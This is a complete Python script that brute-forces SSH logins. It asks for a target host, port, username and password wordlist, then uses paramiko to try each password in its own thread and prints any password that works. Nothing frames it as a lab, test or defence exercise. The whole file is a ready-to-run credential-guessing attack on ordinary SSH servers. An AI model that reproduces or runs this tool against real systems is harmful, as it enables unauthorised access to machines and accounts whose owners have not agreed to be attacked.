import paramiko  #type:ignore
import time
import threading

host = input("Enter the host(target Machine..) :")
port = int(input("Enter SSH port ( Default 22) : "))
username = input("Enter Username: ")
wordlist_path = input("Enter wordlist's path(Ex : .../.../.../) : ")

found = False

def brute_force(password):
 global found
 if found :
    return
 password = password.strip()
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 try :
             client.connect(host, port=port, username=username, password=password, timeout =3) # 3s to wait if the ssh server give an answer if not raise my exception
             print(f"Password found ! : {password}")
             found = True
             return
 except paramiko.AuthenticationException :
           time.sleep(1) # 1s between each attemp
           print("NO Pass match")
 except Exception as e:
            time.sleep(1)
            print(f"There's an error {e}")
 finally:
          client.close()

with open (wordlist_path, "r") as f:
  passwords = f.readlines()
threads = []
for password in passwords:
       if found :
              break
       thread = threading.Thread(target=brute_force,args=(password,))
       thread.start()
       threads.append(thread)

       time.sleep(0.3)
for thread in threads :
       thread.join()
 
 
